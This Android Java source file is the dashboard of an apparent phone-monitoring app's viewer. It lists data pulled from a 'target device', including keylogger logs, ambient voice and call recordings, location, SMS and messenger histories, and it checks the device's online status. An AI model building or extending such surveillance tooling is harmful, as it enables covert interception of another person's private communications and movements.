package com.scp.viewer.View;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.DialogInterface;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.AsyncTask;
import android.os.Bundle;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.GridLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import android.os.CountDownTimer;
import android.os.Handler;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import com.google.gson.Gson;
import com.scp.viewer.API.APIDatabase;
import com.scp.viewer.API.APIGetTotalItemOfFeature;
import com.scp.viewer.API.APIMethod;
import com.scp.viewer.API.APIURL;
import com.scp.viewer.Adapter.AdapterFeatureDashboard;
import com.scp.viewer.Database.DatabaseDevice;
import com.scp.viewer.Model.DeviceStatus;
import com.scp.viewer.Model.Feature;
import com.scp.viewer.Model.Table;
import com.scp.viewer.R;
import com.r0adkll.slidr.Slidr;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import static com.scp.viewer.API.APIMethod.GetJsonCheckConnectionFeature;
import static com.scp.viewer.API.APIMethod.getMilliFromDate;
import static com.scp.viewer.API.APIURL.getTimeNow;
import static com.scp.viewer.API.Global.APP_INSTALL_PULL_ROW;
import static com.scp.viewer.API.Global.APP_USAGE_PULL_ROW;
import static com.scp.viewer.API.Global.CALENDAR_PULL_ROW;
import static com.scp.viewer.API.Global.CALL_PULL_ROW;
import static com.scp.viewer.API.Global.CLIPBOARD_PULL_ROW;
import static com.scp.viewer.API.Global.CONTACT_PULL_ROW;
import static com.scp.viewer.API.Global.FACEBOOK_PULL_ROW;
import static com.scp.viewer.API.Global.GET_AMBIENT_VOICE_RECORDING;
import static com.scp.viewer.API.Global.GPS_PULL_ROW;
import static com.scp.viewer.API.Global.HANGOUTS_PULL_ROW;
import static com.scp.viewer.API.Global.INSTAGRAM_PULL_ROW;
import static com.scp.viewer.API.Global.KEYLOGGER_PULL_ROW;
import static com.scp.viewer.API.Global.NETWORK_CONNECTION_PULL_ROW;
import static com.scp.viewer.API.Global.NOTE_PULL_ROW;
import static com.scp.viewer.API.Global.NOTIFICATION_PULL_ROW;
import static com.scp.viewer.API.Global.PHONE_CALL_RECORDING_PULL_ROW;
import static com.scp.viewer.API.Global.PHOTO_PULL_ROW;
import static com.scp.viewer.API.Global.SKYPE_PULL_ROW;
import static com.scp.viewer.API.Global.SMS_PULL_ROW;
import static com.scp.viewer.API.Global.TYPE_CHECK_CONNECTION;
import static com.scp.viewer.API.Global.URL_PULL_ROW;
import static com.scp.viewer.API.Global.VIBER_PULL_ROW;
import static com.scp.viewer.API.Global.WHATSAPP_PULL_ROW;
import static com.scp.viewer.API.Global.YOUTUBE_PULL_ROW;

public class DashBoard extends AppCompatActivity {

    private RecyclerView rcl_Feature;
    private TextView txt_NamePhone,txt_PhoneStyle,txt_PhoneVersion,txt_Last_Sync;
    private Button btn_Sync_Settings, btn_Check_Status;
    public Table table;
    private AdapterFeatureDashboard mAdapter;
    private long mLastClickTime = System.currentTimeMillis();
    private static final long CLICK_TIME_INTERVAL = 300;
    private String packageID;
    ArrayList<Feature> featureList;
    private String minDateCheck;

    // Dialog
    AlertDialog.Builder mBuilder;
    AlertDialog dialog;
    ProgressBar PrB_Check_Connection;
    LinearLayout ln_Device_Status, ln_Progress_Check_Connection;
    TextView txt_Percent, txt_Seconds, txt_Device_Name, txt_Status_Online, txt_GPS_Status, txt_WiFi_Status, txt_Battery_Status;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dashboard);
        Slidr.attach(this);
        String modelDevice = getIntent().getStringExtra("device");
        packageID = getIntent().getStringExtra("packageID");
        /* database */
        DatabaseDevice databaseDevice = new DatabaseDevice(this);
        List<Table> tableList = databaseDevice.getAllDevice();
        for (Table t : tableList) {

            Log.d("deviceID", "t.getID() = " + t.getID() + "modelDevice = " + modelDevice);
            if (t.getID().equals(modelDevice)) {
                table = t;
                break;
            }
        }
        setID();
        setEvent();
    }

    private void setEvent()
    {
        rcl_Feature.setHasFixedSize(true);
        RecyclerView.LayoutManager mLayoutManager = new GridLayoutManager(this,3);
        rcl_Feature.setLayoutManager(mLayoutManager);
        featureList = new ArrayList<>();

        featureList.add(new Feature(R.drawable.call_icon, getApplicationContext().getResources().getString(R.string.CALL_HISTORY), CALL_PULL_ROW));
        featureList.add(new Feature(R.drawable.messeage_app, getApplicationContext().getResources().getString(R.string.SMS_HISTORY), SMS_PULL_ROW));
        featureList.add(new Feature(R.drawable.contact_icon, getApplicationContext().getResources().getString(R.string.CONTACT_HISTORY), CONTACT_PULL_ROW));
        featureList.add(new Feature(R.drawable.url_browser, getApplicationContext().getResources().getString(R.string.URL_HISTORY), URL_PULL_ROW));
        featureList.add(new Feature(R.drawable.gps_icon, getApplicationContext().getResources().getString(R.string.LOCATION_HISTORY), GPS_PULL_ROW));
        featureList.add(new Feature(R.drawable.photo, getApplicationContext().getResources().getString(R.string.PHOTO_HISTORY), PHOTO_PULL_ROW));
        featureList.add(new Feature(R.drawable.phone_call_icon, getApplicationContext().getResources().getString(R.string.PHONE_CALL_RECORDING), PHONE_CALL_RECORDING_PULL_ROW));
        featureList.add(new Feature(R.drawable.voice_record_icon, getApplicationContext().getResources().getString(R.string.AMBIENT_VOICE_RECORDING), GET_AMBIENT_VOICE_RECORDING));
        featureList.add(new Feature(R.drawable.app_usage_icon, getApplicationContext().getResources().getString(R.string.APPLICATION_USAGE), APP_USAGE_PULL_ROW));
        featureList.add(new Feature(R.drawable.app_install, getApplicationContext().getResources().getString(R.string.APPLICATION_INSTALL), APP_INSTALL_PULL_ROW)); // 2021-07-12
        featureList.add(new Feature(R.drawable.ic_clipboard, getApplicationContext().getResources().getString(R.string.CLIPBOARD_HISTORY), CLIPBOARD_PULL_ROW));

        featureList.add(new Feature(R.drawable.note_icon, getApplicationContext().getResources().getString(R.string.NOTES_HISTORY), NOTE_PULL_ROW));
        featureList.add(new Feature(R.drawable.calendar_icon,getApplicationContext().getResources().getString(R.string.CALENDAR_HISTORY), CALENDAR_PULL_ROW));
        featureList.add(new Feature(R.drawable.wifi_status,getApplicationContext().getResources().getString(R.string.NETWORK_HISTORY),NETWORK_CONNECTION_PULL_ROW));
        featureList.add(new Feature(R.drawable.ic_youtube, getApplicationContext().getResources().getString(R.string.YOUTUBE_HISTORY), YOUTUBE_PULL_ROW));
        featureList.add(new Feature(R.drawable.notification_icon,getApplicationContext().getResources().getString(R.string.NOTIFICATION_HISTORY), NOTIFICATION_PULL_ROW));
        featureList.add(new Feature(R.drawable.keylogger_icon,getApplicationContext().getResources().getString(R.string.KEYLOGGER_HISTORY), KEYLOGGER_PULL_ROW));

        featureList.add(new Feature(R.drawable.whatsapp_icon, getApplicationContext().getResources().getString(R.string.WHATSAPP_HISTORY), WHATSAPP_PULL_ROW));
        featureList.add(new Feature(R.drawable.viber_icon, getApplicationContext().getResources().getString(R.string.VIBER_HISTORY), VIBER_PULL_ROW));
        featureList.add(new Feature(R.drawable.messenger_small, getApplicationContext().getResources().getString(R.string.FACEBOOK_HISTORY), FACEBOOK_PULL_ROW));
        featureList.add(new Feature(R.drawable.skype_icon, getApplicationContext().getResources().getString(R.string.SKYPE_HISTORY), SKYPE_PULL_ROW));
        featureList.add(new Feature(R.drawable.hangoust, getApplicationContext().getResources().getString(R.string.HANGOUTS_HISTORY), HANGOUTS_PULL_ROW));
        featureList.add(new Feature(R.drawable.instagram_icon, getApplicationContext().getResources().getString(R.string.INSTAGRAM_HISTORY), INSTAGRAM_PULL_ROW)); // 2021-07-23

        APIDatabase.getTimeLastSync(txt_Last_Sync, DashBoard.this, table.getLast_Online());
        // adapter
        mAdapter = new AdapterFeatureDashboard(featureList, DashBoard.this, table);
        rcl_Feature.setAdapter(mAdapter);

        Log.d("TotalRoS"," table.getDevice_Identifier() = "+  table.getDevice_Identifier());
        new APIGetTotalItemOfFeature.AllRowTotalAsyncTask(table.getDevice_Identifier(), DashBoard.this, mAdapter, rcl_Feature, featureList, table).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);

        btn_Sync_Settings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                long now = System.currentTimeMillis();
                if (now - mLastClickTime > CLICK_TIME_INTERVAL) {

                    Log.d("mLastClickTime", "mLastClickTime = " + mLastClickTime);
                    Intent intent = new Intent(getApplicationContext(), SyncSettings.class);
                    //  intent sends the device object to the class Dashboard
                    intent.putExtra("device", table.getID());
                    intent.putExtra("packageID",ManagementDevice.packageID);
                    startActivity(intent);
                }
                 mLastClickTime = now;
            }
        });

        btn_Check_Status.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                // handle get connection
                if (APIURL.isConnected(DashBoard.this))
                {
                    setDialog(DashBoard.this);
                    // Dialog includes: Process name, Progress, Detailed target device information (Display can't get device information when Network Offline)
                    // Display custom process Dialog at 0% Starting...
                    // handle get gps now
                    setProgressCheckConnection(20);
                    final String minDate = getTimeNow();
                    // handle check connection
                    new APIMethod.PushNotification(table.getID(), TYPE_CHECK_CONNECTION, table.getDevice_Identifier(), 0).execute();

                    // Show Dialog custom process at 30% Push notification to the target app.
                    setProgressCheckConnection(30);
                    countDownTimer();
                    setDePlay(minDate);

                } else {
                    Toast.makeText(DashBoard.this, R.string.TurnOn, Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    /**
     * set ID for TextView, EditText, Button...
     */
    private void setID()
    {
        rcl_Feature = findViewById(R.id.rcl_Dashboard);
        btn_Sync_Settings = findViewById(R.id.btn_Sync_Settings);
        txt_NamePhone = findViewById(R.id.txt_NamePhone);
        txt_PhoneStyle = findViewById(R.id.txt_PhoneStyle);
        txt_PhoneVersion = findViewById(R.id.txt_PhoneVersion);
        txt_Last_Sync = findViewById(R.id.txt_Last_Sync);
        txt_NamePhone.setText(table.getDevice_Name());
        txt_PhoneStyle.setText(table.getOS_Device());
        txt_PhoneVersion.setText(table.getApp_Version_Number());
        btn_Check_Status = findViewById(R.id.btn_Check_Status);
    }

    /**
     * setDialog this is the Dialog constructor for the get GPS now method.
     */
    public void setDialog(final Activity mActivity)
    {
        mBuilder = new AlertDialog.Builder(mActivity);
        @SuppressLint("InflateParams") View mView = LayoutInflater.from(mActivity).inflate(R.layout.item_dialog_pushnotification_check_connection, null);

        // Progress Bar
        PrB_Check_Connection = mView.findViewById(R.id.PrB_Check_Connection);

        // TextView
        txt_Percent = mView.findViewById(R.id.txt_Percent);
        txt_Device_Name = mView.findViewById(R.id.txt_Device_Name);
        txt_Seconds = mView.findViewById(R.id.txt_Seconds);
        txt_Status_Online = mView.findViewById(R.id.txt_Status_Online);
        txt_GPS_Status = mView.findViewById(R.id.txt_GPS_Status);
        txt_WiFi_Status = mView.findViewById(R.id.txt_WiFi_Status);
        txt_Battery_Status = mView.findViewById(R.id.txt_Battery_Status);

        // LinearLayout
        ln_Device_Status = mView.findViewById(R.id.ln_Device_Status);
        ln_Progress_Check_Connection = mView.findViewById(R.id.ln_Progress_Check_Connection);
        ln_Device_Status.setVisibility(View.GONE);

        mBuilder.setView(mView);
        dialog = mBuilder.create();
        Objects.requireNonNull(dialog.getWindow()).setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.show();
        txt_Percent.setText("0% to Complete");

        dialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
            @Override
            public void onDismiss(DialogInterface dialogInterface) {
                // handle when exiting dialog
                //Toast.makeText(mActivity, "Close Dialog", Toast.LENGTH_SHORT).show();
            }
        });
    }

    @SuppressLint("SetTextI18n")
    private void setProgressCheckConnection(int percent)
    {
        //PrB_Check_Connection.setProgress(percent);

        if(percent == 100)
            txt_Percent.setText("Completed");
        else
            txt_Percent.setText(percent+"% to Complete");
    }

    /**
     * setDePlay is the method to wait for how many seconds before performing the next steps.
     */
    public void setDePlay( final String minDate)
    {
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                // The processor obtains information about the current state of the target device.
                minDateCheck = getTimeNow();
                new checkConnectAsyncTask(minDate).execute();
            }
        }, 20000);
    }

    private void countDownTimer()
    {
        new CountDownTimer(20000, 1000) {

            public void onTick(long duration) {
                //tTimer.setText("seconds remaining: " + millisUntilFinished / 1000);
                //here you can have your logic to set text to edittext resource id
                // Duration
                long second = (duration / 1000) % 60;
                txt_Seconds.setText(second + " Seconds");

                if (second == 18)
                    setProgressCheckConnection(40);
                else if(second == 16)
                    setProgressCheckConnection(45);
                else if(second == 14)
                    setProgressCheckConnection(50);
                else if(second == 12)
                    setProgressCheckConnection(55);
                else if(second == 10)
                    setProgressCheckConnection(60);
                else if(second == 8)
                    setProgressCheckConnection(65);
                else if(second == 6)
                    setProgressCheckConnection(70);
                else if(second == 4)
                    setProgressCheckConnection(75);
                else if(second == 2)
                    setProgressCheckConnection(80);
                else if(second == 0)
                    setProgressCheckConnection(85);
            }

            public void onFinish() {
                txt_Seconds.setText("Done");
            }

        }.start();

    }

    /**
     * getGPSNowAsyncTask this is the AsyncTask method that calls the server to get the latest status information of the target device.
     */
    private class checkConnectAsyncTask extends AsyncTask<String, Void, String>
    {

        String minDate;

        public checkConnectAsyncTask(String minDate) {
            this.minDate = minDate;
        }

        @Override
        protected String doInBackground(String... strings)
        {

            Log.d("locationId", table.getDevice_Identifier() + "");
            return GetJsonCheckConnectionFeature(table.getDevice_Identifier());
        }

        @SuppressLint("SetTextI18n")
        @Override
        protected void onPostExecute(String s) {
            try {

                setProgressCheckConnection(90);

                // Display custom process Dialog at 70% Get GPS now...
                APIURL.deviceObject(s);
                JSONObject jsonObj = new JSONObject(APIURL.bodyLogin.getData());

                if (!APIURL.bodyLogin.getData().isEmpty())
                {
                    Gson gson = new Gson();
                    DeviceStatus deviceStatus = gson.fromJson(String.valueOf(jsonObj), DeviceStatus.class);
                    txt_Device_Name.setText(table.getDevice_Name());
                    // handle the latest gps display
                    ln_Device_Status.setVisibility(View.VISIBLE);
                    ln_Progress_Check_Connection.setVisibility(View.GONE);

                    if(deviceStatus != null && deviceStatus.getLastOnline()!=null && getMilliFromDate(minDateCheck) < getMilliFromDate(deviceStatus.getLastOnline()))
                    {

                        // error when converting GPS data
                        txt_Status_Online.setText("The device is online now "+ deviceStatus.getLastOnline());
                        if(deviceStatus.getgPSOptionTurned() != null && deviceStatus.getgPSOptionTurned())
                            txt_GPS_Status.setText("Access to my location option turned on");
                        else
                            txt_GPS_Status.setText("Access to my location option turned off");

                        if(deviceStatus.getWifiEnabled() != null && deviceStatus.getWifiEnabled())
                            txt_WiFi_Status.setText("Wifi is turn on");
                        else
                            txt_WiFi_Status.setText("Wifi is turn off");

                        if((deviceStatus.getBattery() != null) || !deviceStatus.getBattery().isEmpty())
                            txt_Battery_Status.setText(deviceStatus.getBattery() + "%");
                        else
                            txt_Battery_Status.setText("Unknown");
                    }
                    else {

                        // error when converting Check-Connection data
                        txt_Status_Online.setText("The device is offline now (Maybe your device is in sleep mode).");
                        txt_GPS_Status.setText("Access to my location option turned off");
                        txt_WiFi_Status.setText("Wifi is turn off");
                        txt_Battery_Status.setText("Unknown");
                    }
                }
                else
                {
                    // error when get Check-Connection data
                    txt_Status_Online.setText("The device is offline now (Maybe your device is in sleep mode).");
                    txt_GPS_Status.setText("Access to my location option turned off");
                    txt_WiFi_Status.setText("Wifi is turn off");
                    txt_Battery_Status.setText("Unknown");
                }


            } catch (JSONException e) {
                e.printStackTrace();
                // error when get Check-Connection data
                txt_Device_Name.setText(table.getDevice_Name());
                ln_Device_Status.setVisibility(View.VISIBLE);
                ln_Progress_Check_Connection.setVisibility(View.GONE);
                txt_Status_Online.setText("The device is offline now (Maybe your device is in sleep mode).");
                txt_GPS_Status.setText("Access to my location option turned off");
                txt_WiFi_Status.setText("Wifi is turn off");
                txt_Battery_Status.setText("Unknown");
            }
        }
    }


    @Override
    protected void onResume() {
        super.onResume();

        /*mAdapter = new AdapterFeatureDashboard(featureList, DashBoard.this, table);
        rcl_Feature.setAdapter(mAdapter);*/
        Log.d("TotalRoS", "onResume"+ "\t\t\t\t\t\t\t\t onResume");
        //new APIGetTotalItemOfFeature.AllRowTotalAsyncTask(table.getDevice_Identifier(), DashBoard.this, mAdapter, rcl_Feature, featureList, table).execute();

    }
}
